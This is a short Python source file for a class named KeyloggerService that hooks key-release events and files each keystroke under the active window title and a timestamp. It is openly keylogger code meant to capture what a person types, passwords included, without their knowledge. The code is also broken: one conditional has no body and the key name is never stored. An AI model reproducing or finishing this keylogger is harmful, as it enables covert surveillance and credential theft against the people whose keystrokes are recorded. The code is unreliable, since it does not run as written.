import keyboard
from  _datetime import datetime
import pygetwindow as pw
class KeyloggerService:

    def __init__(self):
        self.data = {}

    def getKeyWord(self):
        def callback(event):
            eventName = event.name
            current_time = self.getTime(event)
            activeWindow = self.getWindowName()

            if activeWindow not in self.data:
                self.data[activeWindow] = {}
            if current_time not in self.data[activeWindow]:


        keyboard.on_release(callback)




    def getWindowName(self):
        return pw.getActiveWindowTitle()




    def getTime(self, event):
        return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")